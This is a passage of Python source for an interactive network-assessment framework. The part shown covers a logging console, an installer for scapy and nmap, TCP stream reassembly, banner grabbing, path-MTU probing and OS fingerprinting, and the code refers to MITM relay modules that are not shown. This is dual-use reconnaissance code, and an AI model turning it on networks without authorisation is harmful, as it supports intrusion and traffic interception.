                    if str(socket_entry.get("port", "")).isdigit() else ""))
            note("%d socket(s) listed." % len(sockets))
            continue
        if choice == "5":
            show_neighbour_cache()
            continue
        if choice == "6":
            forwarding = KernelForwarding()
            heading("KERNEL IP FORWARDING STATE")
            kv_table(forwarding.status().items())
            continue
        if choice == "7":
            remote_host_dossier_interactive()
            continue
        report = SystemIntel.report()
        heading("HOST AND NETWORK REPORT")
        kv_table([
            ("Hostname", report["hostname"]),
            ("Platform", report["platform"]),
            ("Architecture", report["architecture"]),
            ("Python", report["python"]),
            ("Boot time", report["boot_time"]),
            ("Uptime", report["uptime"]),
            ("Load average", report["load_average"]),
            ("EUID / root", "%s / %s" % (report["privileges"]["euid"], report["privileges"]["is_root"])),
            ("Raw sockets", "available" if report["privileges"]["raw_socket_ok"] else "unavailable"),
            ("Primary interface", report["primary_interface"] or "n/a"),
            ("Default gateway", report["default_gateway"] or "n/a"),
            ("DNS servers", ", ".join(report["dns_servers"]) or "none detected"),
        ])
        InterfaceManager.display()
        out("")
        out(c("  sockets listening", "cyan"))
        for socket_entry in report["listening_sockets"][:40]:
            out("    %-6s %-18s port %-6s %s" % (
                socket_entry.get("protocol", "?"), socket_entry.get("local_address", "?"),
                socket_entry.get("port", "?"), socket_entry.get("state", "?")))
        if report["nic_counters"]:
            out("")
            out(c("  interface counters", "cyan"))
            for counter in report["nic_counters"]:
                out("    %-10s rx=%s tx=%s rxerr=%s txerr=%s rxdrop=%s txdrop=%s mtu=%s" % (
                    counter.get("interface", "?"),
                    format_bytes(int(counter.get("rx_bytes", 0) or 0))
                    if str(counter.get("rx_bytes", "")).isdigit() else "n/a",
                    format_bytes(int(counter.get("tx_bytes", 0) or 0))
                    if str(counter.get("tx_bytes", "")).isdigit() else "n/a",
                    counter.get("rx_errors", "?"), counter.get("tx_errors", "?"),
                    counter.get("rx_dropped", "?"), counter.get("tx_dropped", "?"),
                    counter.get("mtu", "?")))
        artifact = LOGGER.scan("system_intel", report, target=report["hostname"])
        if artifact:
            note("artefact: %s" % artifact)


# ===========================================================================
# MODULE 10 - LOGGING CONSOLE (session ledger management)
# ===========================================================================
@module_guard("Logging Console")
def module_logging_console(args: Optional[List[str]] = None) -> None:
    """Inspect, tail, export and remotely ship the session journals."""
    while True:
        heading("MODULE 10 - LOGGING CONSOLE")
        options = OrderedDict([
            ("1", "Show session file locations and statistics"),
            ("2", "Tail the most recent events"),
            ("3", "Filter the event stream by category"),
            ("4", "List scan artefacts"),
            ("5", "Export a compressed archive of this session"),
            ("6", "ONLINE: ship this journal to a remote syslog collector (UDP/TCP/TLS)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("log> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()
        if choice == "0":
            return
        if choice == "1":
            heading("SESSION JOURNAL")
            stats = LOGGER.counters
            kv_table([
                ("Session ID", LOGGER.session_id),
                ("Text ledger", LOGGER.txt_path),
                ("JSON events", LOGGER.json_path),
                ("Summary (on exit)", LOGGER.summary_path),
                ("Artefact directory", LOGGER.artifact_dir),
                ("Events recorded", sum(stats.values())),
                ("Failed operations", stats.get("errors", 0)),
                ("Terminal mirroring", "enabled" if LOGGER.mirror_terminal else "disabled"),
                ("Session started", format_timestamp(LOGGER.started_at)),
                ("Running for", format_duration(time.time() - LOGGER.started_at)),
            ])
            out("")
            out(c("  event categories", "cyan"))
            for kind, count in sorted(stats.items()):
                out("    %-16s %6d" % (kind, count))
            continue
        if choice == "2":
            count = prompt_int("how many trailing events?", 1, 500, 40)
            if count is PROMPT_ABORT:
                continue
            heading("RECENT EVENT STREAM")
            for line in LOGGER.tail(int(count)):
                out("  %s" % line)
            continue
        if choice == "3":
            kind = prompt_text("category (session/scan/module_start/module_end/error/privilege/mitm/kernel/artifact/warn)",
                               default="scan")
            if kind is PROMPT_ABORT:
                continue
            count = prompt_int("maximum lines", 1, 500, 30)
            if count is PROMPT_ABORT:
                continue
            heading("EVENTS: %s" % str(kind).upper())
            lines = LOGGER.tail(int(count), kind=str(kind))
            if not lines:
                warn("no events recorded under that category.")
            for line in lines:
                out("  %s" % line)
            continue
        if choice == "4":
            heading("SCAN ARTEFACTS")
            entries: List[Tuple[str, float, int]] = []
            try:
                for name in os.listdir(LOGGER.artifact_dir):
                    full = os.path.join(LOGGER.artifact_dir, name)
                    try:
                        stat_info = os.stat(full)
                    except OSError:
                        continue
                    entries.append((name, stat_info.st_mtime, stat_info.st_size))
            except OSError as exc:
                err("artefact directory unreadable: %s" % exc)
                continue
            if not entries:
                warn("no artefacts written yet in this session.")
                continue
            for name, modified, size in sorted(entries, key=lambda item: item[1], reverse=True):
                out("  %s  %-9s  %s" % (
                    c(format_timestamp(modified), "grey"), format_bytes(size), c(name, "cyan")))
            note("%d artefact(s) in %s" % (len(entries), LOGGER.artifact_dir))
            continue
        if choice == "6":
            syslog_console_interactive()
            continue
        if choice == "5":
            archive_base = os.path.join(LOGGER.log_dir, "prismstrike_bundle_%s" % LOGGER.session_id)
            try:
                archive_path = shutil.make_archive(archive_base, "zip", root_dir=LOGGER.log_dir)
                ok("session bundle written: %s (%s)" % (
                    archive_path,
                    format_bytes(os.path.getsize(archive_path)) if os.path.exists(archive_path) else "?"))
                LOGGER.event("log", "session bundle exported", data={"archive": archive_path})
            except (OSError, ValueError) as exc:
                err("bundle export failed: %s" % exc)
            continue
        warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 11 - DEPENDENCY DOCTOR
# ===========================================================================
class DependencyDoctor:
    """Runtime capability audit with guided remediation."""

    @staticmethod
    def audit() -> List[Dict[str, Any]]:
        checks: List[Dict[str, Any]] = []
        checks.append(OrderedDict([
            ("name", "scapy engine"),
            ("required", "packet crafting/capture"),
            ("status", "ok" if SCAPY_AVAILABLE else "missing"),
            ("detail", scapy_version_string()),
            ("remedy", "python3 -m pip install scapy"),
        ]))
        checks.append(OrderedDict([
            ("name", "python-nmap binding"),
            ("required", "nmap sub-engine"),
            ("status", "ok" if NMAP_LIB_AVAILABLE else "missing"),
            ("detail", "importable" if NMAP_LIB_AVAILABLE else NMAP_LIB_ERROR),
            ("remedy", "python3 -m pip install python-nmap"),
        ]))
        nmap_binary = shutil.which("nmap")
        checks.append(OrderedDict([
            ("name", "nmap binary"),
            ("required", "port/service scanning"),
            ("status", "ok" if nmap_binary else "missing"),
            ("detail", NmapEngine.binary_version() if nmap_binary else "not found in PATH"),
            ("remedy", "sudo apt install nmap | brew install nmap | winget install Insecure.Org.Nmap"),
        ]))
        checks.append(OrderedDict([
            ("name", "root/administrator"),
            ("required", "raw sockets, ARP, forwarding toggles"),
            ("status", "ok" if Privileges.is_root() else "warning"),
            ("detail", "euid=%s" % (Privileges.euid() if Privileges.euid() is not None else "n/a")),
            ("remedy", "relaunch with sudo / elevated prompt"),
        ]))
        checks.append(OrderedDict([
            ("name", "CAP_NET_RAW capability"),
            ("required", "unprivileged raw sockets"),
            ("status", "ok" if Privileges.raw_socket_available() else "missing"),
            ("detail", "raw ICMP socket probe"),
            ("remedy", "sudo setcap cap_net_raw,cap_net_admin=eip $(readlink -f $(which python3))"),
        ]))
        checks.append(OrderedDict([
            ("name", "kernel forwarding control"),
            ("required", "MITM relay"),
            ("status", "ok" if KernelForwarding().available else "warning"),
            ("detail", KernelForwarding().detail),
            ("remedy", "Linux: /proc/sys/net/ipv4/ip_forward  |  macOS: sysctl net.inet.ip.forwarding"),
        ]))
        capture_caps = pcap_ingest_capabilities()
        checks.append(OrderedDict([
            ("name", "capture ingest (pcap + pcapng)"),
            ("required", "offline capture analysis (module 08/13)"),
            ("status", "ok" if (capture_caps["scapy_pcap"] and capture_caps["pcapng_reader"])
                       else ("warning" if capture_caps["scapy_pcap"] else "missing")),
            ("detail", "scapy %s | pcap reader=%s | pcapng reader=%s | pcapng writer=%s | "
                       "libpcap=%s | tcpdump=%s | dumpcap=%s"
                       % (capture_caps["scapy_version"] or "n/a",
                          "yes" if capture_caps["scapy_pcap"] else "no",
                          "yes" if capture_caps["pcapng_reader"] else "no",
                          "yes" if capture_caps["pcapng_writer"] else "no",
                          capture_caps["libpcap"] or "not found",
                          capture_caps["tcpdump"] or "not found",
                          capture_caps["dumpcap"] or "not found")),
            ("remedy", "; ".join(capture_caps["warnings"]) or
                       "python3 -m pip install -U scapy | apt install tcpdump libpcap0.8"),
        ]))
        checks.append(OrderedDict([
            ("name", "packet capture backend"),
            ("required", "sniffing, ARP sweeps, relay accounting"),
            ("status", "ok" if (SCAPY_AVAILABLE and Privileges.raw_socket_available()) else "warning"),
            ("detail", "libpcap/npcap via scapy raw sockets"),
            ("remedy", "install libpcap-dev (Linux) or Npcap (Windows)"),
        ]))
        checks.append(OrderedDict([
            ("name", "logging directory"),
            ("required", "audit trail"),
            ("status", "ok" if os.path.isdir(LOGGER.log_dir) and os.access(LOGGER.log_dir, os.W_OK) else "missing"),
            ("detail", LOGGER.log_dir),
            ("remedy", "create the directory or pass --log-dir to a writable location"),
        ]))
        return checks

    @staticmethod
    def render(checks: List[Dict[str, Any]]) -> None:
        heading("DEPENDENCY AUDIT")
        for check in checks:
            status = check["status"]
            badge = {"ok": c("  OK   ", "bgreen", "bold"),
                     "warning": c(" WARN  ", "byellow", "bold"),
                     "missing": c(" MISS  ", "bred", "bold")}.get(status, c("  ?   ", "grey"))
            out("  %s %-26s %-34s %s" % (badge, check["name"], check["detail"][:34],
                                         c(check["required"], "grey")))
            if status != "ok":
                out("         %s %s" % (c("remedy:", "byellow"), c(check["remedy"], "green")))

    @staticmethod
    def remediate(name: str) -> bool:
        """Attempt an automatic install for the named dependency."""
        message = ""
        if name == "scapy engine":
            command = [sys.executable, "-m", "pip", "install", "scapy"]
        elif name == "python-nmap binding":
            command = [sys.executable, "-m", "pip", "install", "python-nmap"]
        elif name == "nmap binary":
            if platform.system().lower() == "debian" or "debian" in platform.platform().lower() or \
                    os.path.exists("/etc/debian_version"):
                command = ["sudo", "-n", "apt-get", "install", "-y", "nmap"]
            elif platform.system().lower() == "darwin":
                command = ["brew", "install", "nmap"]
            else:
                message = "manual installation required for this platform"
                command = []
        else:
            message = "no automatic remediation available for '%s'" % name
            command = []
        if not command:
            warn(message or "nothing to do")
            return False
        note("running: %s" % " ".join(command))
        try:
            completed = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       timeout=600, check=False, text=True)
        except (OSError, subprocess.SubprocessError) as exc:
            err("remediation command failed to start: %s" % exc)
            return False
        tail = "\n".join((completed.stdout or "").strip().splitlines()[-6:])
        if completed.returncode == 0:
            ok("remediation command completed successfully.")
            if tail:
                out(c(tail, "grey"))
            note("restart the framework to guarantee module reloads pick up the change.")
            LOGGER.event("dependency", "remediation succeeded for %s" % name, data={"command": command})
            return True
        err("remediation returned exit code %d" % completed.returncode)
        if tail:
            out(c(tail, "grey"))
        LOGGER.event("dependency", "remediation failed for %s" % name, level="WARN",
                     data={"command": command, "rc": completed.returncode})
        return False


@module_guard("Dependency Doctor")
def module_dependency_doctor(args: Optional[List[str]] = None) -> None:
    """Interactive capability audit, guided installation and online freshness checks."""
    while True:
        checks = DependencyDoctor.audit()
        heading("MODULE 11 - DEPENDENCY DOCTOR")
        DependencyDoctor.render(checks)
        options = OrderedDict([
            ("1", "Attempt automatic remediation for all missing dependencies"),
            ("2", "Remediate one specific dependency"),
            ("3", "Re-run the audit"),
            ("4", "Install everything (pip + nmap) unattended"),
            ("5", "ONLINE: compare installed packages with the published releases"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("doctor> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()
        if choice == "0":
            return
        if choice == "3":
            # Re-run the audit: loop back to the top, which re-renders every check.
            note("re-running the dependency audit ...")
            continue
        if choice == "1":
            missing = [check["name"] for check in checks if check["status"] != "ok"]
            if not missing:
                ok("every audited dependency is present.")
                continue
            for name in missing:
                if not prompt_yes_no("Remediate '%s' now?" % name, False):
                    continue
                DependencyDoctor.remediate(name)
            continue
        if choice == "2":
            for index, check in enumerate(checks, start=1):
                out("  [%s] %s" % (c(str(index), "byellow"), check["name"]))
            pick = prompt_int("dependency number", 1, len(checks), 1)
            if pick is PROMPT_ABORT:
                continue
            DependencyDoctor.remediate(checks[int(pick) - 1]["name"])
            continue
        if choice == "5":
            online_dependency_check_interactive()
            continue
        if choice == "4":
            if not prompt_yes_no("Install scapy, python-nmap and the nmap binary now?", False):
                continue
            for name in ("python-nmap binding", "scapy engine", "nmap binary"):
                DependencyDoctor.remediate(name)
            note("restart the framework to activate newly installed modules.")
            continue
        warn("unrecognised selection '%s'." % choice)




# ===========================================================================
# MODULE 13 - NETWORK UTILITIES (banner grab, MTU discovery, OS fingerprint,
#             TCP stream reassembly, routing decisions)
# ===========================================================================
def pcap_ingest_capabilities() -> Dict[str, Any]:
    """
    Probe the capture-ingest stack: scapy pcap reader, PcapNG reader and helpers.

    Modern capture tooling writes PcapNG by default, so the offline analyst needs both
    readers. This probe reports which pieces are present, keeps the failure detail for
    each, and lists actionable warnings for whatever is missing - the dependency doctor
    renders it as an auditable row and the analyst refuses a PcapNG file it cannot read.
    """
    capabilities: Dict[str, Any] = OrderedDict([
        ("scapy_pcap", bool(SCAPY_AVAILABLE)),
        ("scapy_version", scapy_version_string() if SCAPY_AVAILABLE else ""),
        ("pcapng_reader", False),
        ("pcapng_writer", False),
        ("pcapng_writer_detail", ""),
        ("pcapng_detail", ""),
        ("tcpdump", shutil.which("tcpdump") or ""),
        ("dumpcap", shutil.which("dumpcap") or ""),
        ("tshark", shutil.which("tshark") or ""),
        ("libpcap", ""),
        ("warnings", []),
    ])
    try:
        from scapy.utils import PcapNgReader      # capability probe only
        capabilities["pcapng_reader"] = True
        capabilities["pcapng_detail"] = "scapy %s present" % PcapNgReader.__name__
    except Exception as exc:
        capabilities["pcapng_detail"] = "%s: %s" % (type(exc).__name__, exc)
    try:
        from scapy.utils import PcapNgWriter      # capability probe only
        capabilities["pcapng_writer"] = True
        capabilities["pcapng_writer_detail"] = PcapNgWriter.__name__
    except Exception:
        capabilities["pcapng_writer"] = False
    try:
        import ctypes.util
        capabilities["libpcap"] = ctypes.util.find_library("pcap") or ""
    except Exception:
        capabilities["libpcap"] = ""
    warnings: List[str] = capabilities["warnings"]
    if not capabilities["scapy_pcap"]:
        warnings.append("scapy is missing: no capture ingest at all (pip install scapy)")
    elif not capabilities["pcapng_reader"]:
        warnings.append("the scapy PcapNG reader is missing: .pcapng captures are refused "
                        "(upgrade to scapy>=2.4)")
    if not (capabilities["tcpdump"] or capabilities["dumpcap"]):
        warnings.append("no tcpdump/dumpcap binary found: live capture uses scapy's own "
                        "link-layer bindings and external capture tools cannot be driven "
                        "from here (apt install tcpdump)")
    if not capabilities["libpcap"]:
        warnings.append("no libpcap shared library found: only scapy-native readers are "
                        "available (apt install libpcap0.8)")
    if not capabilities["pcapng_writer"]:
        warnings.append("the scapy PcapNG writer is missing: generated captures use classic "
                        "pcap framing")
    return capabilities


class StreamReassembler:
    """
    Minimal, dependency-free TCP stream reassembler ("follow TCP stream").

    Segments are held per direction keyed by sequence number; extraction walks
    the sequence space from the lowest observed sequence, skipping retransmits,
    stitching overlapping segments, and marking deliberate gaps. Unsigned
    32-bit sequence wraparound is handled by normalising every sequence number
    relative to the flow's initial sequence number.
    """

    def __init__(self) -> None:
        self.flows: Dict[str, Dict[str, Any]] = {}
        self.lock = threading.RLock()

    @staticmethod
    def flow_key(packet: Any) -> Tuple[str, str, int, int]:
        try:
            return (str(packet[IP].src), str(packet[IP].dst),
                    int(packet[TCP].sport), int(packet[TCP].dport))
        except (AttributeError, IndexError, TypeError, ValueError):
            return ("", "", 0, 0)

    @staticmethod
    def _relative(sequence: int, base: int) -> int:
        """Map a 32-bit sequence number into a monotonic offset from `base`."""
        delta = (int(sequence) - int(base)) & 0xFFFFFFFF
        if delta > 0x7FFFFFFF:      # wrapped behind the base
            delta -= 0x100000000
        return delta

    def add(self, packet: Any) -> None:
        """Feed one captured packet into the reassembly buffers."""
        try:
            if not (packet.haslayer(IP) and packet.haslayer(TCP)):
                return
            if int(packet[TCP].flags) & 0x04:      # RST ends the flow
                terminator = True
            else:
                terminator = False
            src_address, dst_address, src_port, dst_port = self.flow_key(packet)
            key = "%s:%d <-> %s:%d" % (src_address, src_port, dst_address, dst_port)
            with self.lock:
                flow = self.flows.setdefault(key, {
                    "client": {"base": None, "segments": {}, "bytes": 0},
                    "server": {"base": None, "segments": {}, "bytes": 0},
                    "packets": 0, "terminated": False,
                    "endpoints": (str(packet[IP].src), str(packet[IP].dst)),
                })
                flow["packets"] += 1
                if terminator:
                    flow["terminated"] = True
                payload = bytes(packet[TCP].payload) if packet[TCP].payload else b""
                if not payload:
                    return
                # The side with the higher source port is treated as the client.
                is_client = int(packet[TCP].sport) > int(packet[TCP].dport)
                direction = "client" if is_client else "server"
                track = flow[direction]
                if track["base"] is None:
                    track["base"] = int(packet[TCP].seq)
                offset = self._relative(int(packet[TCP].seq), track["base"])
                if offset < 0:
                    # The capture started mid-stream: a segment that predates the
                    # assumed initial sequence number re-bases the flow so the
                    # earlier bytes are preserved instead of being discarded.
                    shift = -offset
                    track["segments"] = {existing + shift: chunk
                                         for existing, chunk in track["segments"].items()}
                    track["base"] = int(packet[TCP].seq)
                    offset = 0
                track["segments"][offset] = payload
                track["bytes"] += len(payload)
        except (AttributeError, IndexError, KeyError, TypeError, ValueError):
            return

    def extract(self, direction: str = "both", max_bytes: int = 65536,
                mark_gaps: bool = True) -> Dict[str, bytes]:
        """Flatten the buffered segments into contiguous byte streams."""
        output: Dict[str, bytes] = {}
        with self.lock:
            for flow_key, flow in self.flows.items():
                for side in ("client", "server"):
                    if direction != "both" and direction != side:
                        continue
                    track = flow[side]
                    if not track["segments"]:
                        continue
                    block = bytearray()
                    expected = 0
                    # Stored offsets are non-negative by construction: add() re-bases
                    # the whole buffer whenever a segment that predates the assumed
                    # initial sequence arrives, so a plain ascending sort already follows
                    # the 32-bit wrap timeline (position 0 is always the lowest sequence
                    # observed). The guard below only matters if a future edit ever stores
                    # a negative key - shifting the whole set keeps the timeline
                    # contiguous and positive instead of letting a raw int sort
                    # scramble the stream.
                    offsets = sorted(track["segments"].keys())
                    if offsets and offsets[0] < 0:
                        rebase = -offsets[0]
                        offsets = [offset + rebase for offset in offsets]
                        LOGGER.event("warn", "reassembler: raw negative offset horizon "
                                             "detected (re-based by %d for ordering)" % rebase,
                                     level="WARN")
                    for offset in offsets:
                        if offset > expected and mark_gaps and block:
                            block.extend(b"[<gap %d bytes>]" % (offset - expected))
                        if offset + len(track["segments"][offset]) <= expected:
                            continue                    # pure retransmit
                        if offset < expected:
                            start = expected - offset
                            block.extend(track["segments"][offset][start:])
                            expected = offset + len(track["segments"][offset])
                        else:
                            block.extend(track["segments"][offset])
                            expected = offset + len(track["segments"][offset])
                        if len(block) >= max_bytes:
                            break
                    output["%s [%s]" % (flow_key, side)] = bytes(block[:max_bytes])
        return output

    def summary(self) -> Dict[str, Any]:
        with self.lock:
            return OrderedDict([
                ("flows", len(self.flows)),
                ("detail", {
                    key: {"packets": value["packets"],
                          "client_bytes": value["client"]["bytes"],
                          "server_bytes": value["server"]["bytes"],
                          "terminated": value["terminated"]}
                    for key, value in self.flows.items()
                }),
            ])


def render_stream(text: bytes, hex_mode: bool = False, label: str = "") -> None:
    """Print a reassembled byte stream as ASCII (default) or a hex dump."""
    if label:
        out(c("  --- %s (%d bytes) ---" % (label, len(text)), "bmagenta", "bold"))
    if not text:
        out(c("      <no payload captured>", "grey"))
        return
    if hex_mode:
        out(hexdump(text, max_bytes=512))
        return
    printable = "".join(chr(byte) if 32 <= byte < 127 or byte in (9, 10, 13) else "." for byte in text)
    for line in printable.splitlines()[:80]:
        out("      %s" % line[:200])


def _banner_service_hint(text: str, port: int) -> str:
    """Fingerprint a service from its first banner bytes."""
    head = text[:220]
    checks = (
        ("SSH", "SSH-"), ("HTTP", "HTTP/"), ("FTP", "220 "), ("SMTP", "220 "),
        ("POP3", "+OK"), ("IMAP", "* OK"), ("MySQL", "mysql_native_password"),
        ("VNC", "RFB 003."), ("Telnet", "login:"), ("Redis", "-ERR"), ("SMB", "\x00\x00"),
        ("MongoDB", "MongoDB"), ("Elasticsearch", "\"cluster_name\""), ("SOCKS", "\x05"),
    )
    for name, marker in checks:
        if marker in head:
            if name in ("FTP", "SMTP") and port not in (21, 25, 587):
                name = "SMTP-like (220 greeting)"
            return name
    if head.strip().startswith("{") or head.strip().startswith("["):
        return "JSON API"
    if head.strip().startswith("<"):
        return "XML/HTML"
    return "unknown"


def banner_grab(target: str, port: int, timeout: float = 4.0, prologue: bytes = b"",
                read_bytes: int = 4096, use_tls: bool = False,
                tls_sni: Optional[str] = None) -> Dict[str, Any]:
    """
    Connect, optionally speak a protocol prologue, and capture the service banner.

    Uses the standard library socket layer (no scapy involvement) so the result
    is exactly what an ordinary client would see. TLS mode wraps the socket with
    certificate verification disabled, which is the correct posture for
    assessment work against self-signed lab services.
    """
    import ssl as _ssl  # local import keeps the core import list lean
    result: Dict[str, Any] = OrderedDict([
        ("target", target), ("port", port), ("service_hint", "unknown"),
        ("banner", ""), ("banner_len", 0), ("tls", bool(use_tls)),
        ("tls_version", ""), ("tls_cipher", ""), ("tls_peer_cn", ""),
        ("connected", False), ("error", ""), ("response_ms", None),
    ])
    started = time.time()
    sock = None
    try:
        raw_sock = socket.create_connection((target, int(port)), timeout=max(0.5, timeout))
    except (socket.timeout, OSError) as exc:
        result["error"] = "connection failed: %s" % exc
        err("banner grab: %s" % result["error"])
        return result
    try:
        if use_tls:
            context = _ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = _ssl.CERT_NONE
            try:
                sock = context.wrap_socket(raw_sock, server_hostname=tls_sni or target)
                result["tls_version"] = str(sock.version() or "")
                cipher = sock.cipher()
                result["tls_cipher"] = "%s (%s bits)" % (cipher[0], cipher[2]) if cipher else ""
                cert = sock.getpeercert() or {}
                names = [entry[0][1] for entry in cert.get("subject", ()) if entry[0][0] == "commonName"]
                result["tls_peer_cn"] = names[0] if names else ""
            except (_ssl.SSLError, OSError) as exc:
                result["error"] = "TLS handshake failed: %s" % exc
                raw_sock.close()
                err("banner grab: %s" % result["error"])
                return result
        else:
            sock = raw_sock
        result["connected"] = True
        sock.settimeout(max(0.5, timeout))
        if prologue:
            try:
                sock.sendall(prologue)
            except OSError as exc:
                result["error"] = "prologue send failed: %s" % exc
        chunks: List[bytes] = []
        deadline = time.time() + max(0.5, timeout)
        while sum(len(chunk) for chunk in chunks) < read_bytes and time.time() < deadline:
            try:
                chunk = sock.recv(read_bytes)
            except socket.timeout:
                break
            except OSError as exc:
                result["error"] = "read error: %s" % exc
                break
            if not chunk:
                break
            chunks.append(chunk)
            if sum(len(chunk) for chunk in chunks) >= read_bytes:
                break
        raw = b"".join(chunks)
        result["response_ms"] = round((time.time() - started) * 1000.0, 2)
        result["banner_len"] = len(raw)
        text = raw.decode("utf-8", "replace")
        result["banner"] = text[:read_bytes]
        result["service_hint"] = _banner_service_hint(text, int(port))
    except (OSError, ValueError) as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        try:
            if sock is not None:
                sock.close()
        except OSError:
            pass
    colour = "bgreen" if result["connected"] and result["banner"] else "byellow"
    kv_table([
        ("Target", "%s:%d" % (target, port)),
        ("Service hint", c(result["service_hint"], colour, "bold")),
        ("Banner length", result["banner_len"]),
        ("Response time", "%s ms" % result["response_ms"] if result["response_ms"] else "n/a"),
        ("TLS", "%s %s" % (result["tls_version"], result["tls_cipher"]) if use_tls else "disabled"),
        ("Peer CN", result["tls_peer_cn"] or "n/a"),
        ("Error", result["error"] or "none"),
    ])
    if result["banner"]:
        out(c("  raw banner:", "cyan"))
        for line in result["banner"].splitlines()[:12]:
            out("      %s" % line[:180])
        out(hexdump(result["banner"].encode("utf-8", "replace"), max_bytes=64))
    else:
        warn("no banner received (service may wait for a client prologue - try a prologue payload).")
    return result


def mtu_path_discovery(target: str, max_size: int = 1500, min_size: int = 68,
                       timeout: float = 2.0, iface: Optional[str] = None) -> Dict[str, Any]:
    """
    Discover the path MTU with DF-set ICMP echo probes and a binary search.

    A successful echo reply proves the probed size traversed the path; an ICMP
    'fragmentation needed' (type 3, code 4) proves the size was too large and
    may carry the next-hop MTU in the ICMP header's unused field.
    """
    if not require_scapy("MTU path discovery"):
        raise FrameworkError("scapy unavailable")
    if not (min_size <= max_size <= 9000):
        raise FrameworkError("probe sizes must satisfy 68 <= min <= max <= 9000")
    note("path MTU discovery -> %s (probing %d-%d byte payloads with DF set)"
         % (target, min_size, max_size))
    tested: List[Dict[str, Any]] = []
    next_hop_mtu: Optional[int] = None
    low, high = int(min_size), int(max_size)
    best_success: Optional[int] = None

    def probe(size: int) -> Tuple[bool, str]:
        nonlocal next_hop_mtu
        payload = b"P" * size
        try:
            packet = IP(dst=target, flags="DF") / ICMP(type=8, id=random.randint(0, 0xFFFF), seq=size & 0xFFFF) / Raw(payload)
        except Exception as exc:
            return False, "build failed: %s" % exc
        kwargs: Dict[str, Any] = {"timeout": max(0.2, timeout), "verbose": 0}
        if iface:
            kwargs["iface"] = iface
        try:
            reply = sr1(packet, **kwargs)
        except (OSError, PermissionError) as exc:
            return False, "transmit error: %s" % exc
        if reply is None:
            return False, "no reply"
        try:
            if reply.haslayer(ICMP):
                icmp_type = int(reply[ICMP].type)
                icmp_code = int(reply[ICMP].code)
                if icmp_type == 3 and icmp_code == 4:
                    try:
                        reported = int(reply[ICMP].unused)
                        if 0 < reported < 65536:
                            next_hop_mtu = reported
                    except (TypeError, ValueError):
                        next_hop_mtu = None
                    return False, "ICMP fragmentation-needed"
                if icmp_type == 0:
                    return True, "echo reply"
                return False, "ICMP type %d code %d" % (icmp_type, icmp_code)
        except (AttributeError, IndexError, TypeError, ValueError):
            return False, "unparseable reply"
        return False, "non-ICMP reply"

    # Step 1: does the ceiling pass outright?
    ok_at_ceiling, detail = probe(high)
    tested.append(OrderedDict([("size", high), ("passed", ok_at_ceiling), ("detail", detail),
                               ("icmp_reported_mtu", next_hop_mtu)]))
    out("  %-7s %-10s %s" % ("SIZE", "RESULT", "DETAIL"))
    out("  %-7d %-10s %s" % (high, c("PASS" if ok_at_ceiling else "FAIL", "bgreen" if ok_at_ceiling else "byellow"), detail))
    if ok_at_ceiling:
        best_success = high
    else:
        # Step 2: binary search for the largest pass between low and high.
        while low < high:
            mid = (low + high) // 2
            if mid == low:
                break
            passed, mid_detail = probe(mid)
            tested.append(OrderedDict([("size", mid), ("passed", passed), ("detail", mid_detail),
                                       ("icmp_reported_mtu", next_hop_mtu)]))
            out("  %-7d %-10s %s" % (mid, c("PASS" if passed else "FAIL", "bgreen" if passed else "byellow"), mid_detail))
            if passed:
                best_success = mid
                low = mid
            else:
                high = mid
        if best_success is None:
            passed_low, low_detail = probe(min_size)
            tested.append(OrderedDict([("size", min_size), ("passed", passed_low),
                                       ("detail", low_detail), ("icmp_reported_mtu", next_hop_mtu)]))
            out("  %-7d %-10s %s" % (min_size, c("PASS" if passed_low else "FAIL", "bgreen" if passed_low else "byellow"), low_detail))
            if passed_low:
                best_success = min_size
    path_mtu = None
    if best_success is not None:
        path_mtu = best_success + 28          # IPv4 header (20) + ICMP header (8)
    heading("MTU DISCOVERY RESULT")
    kv_table([
        ("Target", target),
        ("Probes issued", len(tested)),
        ("Largest passing payload", best_success if best_success is not None else "none"),
        ("Estimated path MTU", ("%d bytes" % path_mtu) if path_mtu else "unknown (all probes failed)"),
        ("ICMP-reported next-hop MTU", next_hop_mtu if next_hop_mtu else "not advertised"),
        ("Interface", iface or "auto"),
    ])
    if best_success == max_size:
        note("sizes up to the tested ceiling passed - the true path MTU is >= %d bytes." % (max_size + 28))
    summary = OrderedDict([
        ("mode", "mtu-discovery"),
        ("target", target),
        ("path_mtu_estimate", path_mtu),
        ("largest_passing_payload", best_success),
        ("icmp_reported_next_hop_mtu", next_hop_mtu),
        ("probes", tested),
        ("options", {"min_size": min_size, "max_size": max_size, "timeout": timeout,
                     "iface": iface or "auto"}),
    ])
    artifact = LOGGER.scan("mtu_discovery", summary, target=target)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


class OsFingerprinter:
    """
    Heuristic TCP/IP stack fingerprinting from a single SYN/ACK response.

    The probe requests a specific option set; the reply is decomposed into
    evidence (initial TTL, receive window, DF bit, option order, MSS, window
    scale, SACK-permitted, timestamps) and scored against a rule table. This is
    a native alternative to `nmap -O` for environments where the nmap binary is
    unavailable - honest about being a heuristic, with the evidence printed so
    the operator can audit every classification.
    """

    RULES = (
        OrderedDict([
            ("family", "Linux (2.6+ / 3.x / 4.x / 5.x / 6.x kernel)"),
            ("ttl", (64, 127)), ("windows", (29200, 5840, 64240, 64860, 65160, 65535)),
            ("requires", ("SAckOK", "Timestamp")), ("forbids", ()),
            ("order_hint", ("MSS", "SAckOK", "Timestamp", "NOP", "WScale")), ("weight", 10),
        ]),
        OrderedDict([
            ("family", "Windows 10/11 or Server 2016+ (Windows NT stack)"),
            ("ttl", (128, 127, 255)), ("windows", (64240, 65535, 8192, 16384, 65392, 65535)),
            ("requires", ("WScale", "SAckOK")), ("forbids", ()),
            ("order_hint", ("MSS", "NOP", "WScale", "NOP", "NOP", "SAckOK")), ("weight", 9),
        ]),
        OrderedDict([
            ("family", "FreeBSD / macOS / iOS (BSD-derived stack)"),
            ("ttl", (64,)), ("windows", (65535, 33304, 65535)),
            ("requires", ("Timestamp", "SAckOK")), ("forbids", ("WScale",)),
